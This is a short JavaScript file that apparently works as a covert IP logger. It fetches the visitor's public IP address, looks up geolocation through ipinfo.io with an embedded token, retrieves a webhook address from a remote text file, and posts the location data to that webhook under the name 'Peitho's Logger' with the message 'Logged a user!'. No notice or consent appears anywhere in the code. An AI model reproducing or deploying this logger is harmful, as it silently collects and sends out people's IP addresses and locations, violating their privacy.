async function get_ip() {
	let req = await fetch('https://ipv4.icanhazip.com');
	let res = await req.text();
	return res;
}
async function url() {
	let req = await fetch('https://julie420.github.io/resources/url.txt');
	let res = await req.text();
	let hook = res;
	return res;
}

get_ip().then((ip) => {
	async function loc() {
	let req = await fetch(`https://ipinfo.io/${ip}/json?token=505bd0ad097007`);
	let res = await req.text();
	return res;
	}
	loc().then((info) => {

		url().then((hook) => {
			function sendMessage() {
				var request = new XMLHttpRequest();
				request.open('POST', hook);

				request.setRequestHeader('Content-type', 'application/json');

				var params = {
					username: "Peitho's Logger",
					avatar_url: 'https://doggo.ninja/TsY1SP.jpg',
					color: '',
					embeds: [
						{
							color: '19474160',
							title: 'Logged a user!',
							description: `${info}`,
						},
					],
				};

				request.send(JSON.stringify(params));
			}
			sendMessage();
		});
	});
});
